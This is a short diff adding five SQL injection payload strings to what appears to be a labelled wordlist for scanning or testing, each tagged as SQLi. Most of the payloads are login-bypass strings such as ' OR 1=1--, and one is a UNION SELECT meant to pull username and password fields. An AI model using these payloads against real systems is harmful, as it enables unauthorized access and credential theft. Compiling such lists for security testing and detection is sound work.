@@ -1,0 +1,5 @@
+<username>' OR 1=1--:::SQL Injection (SQLi)
+'OR '' = '	Allows authentication without a valid username.:::SQL Injection (SQLi)
+<username>'--:::SQL Injection (SQLi)
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--:::SQL Injection (SQLi)
+'OR 1=1--:::SQL Injection (SQLi)
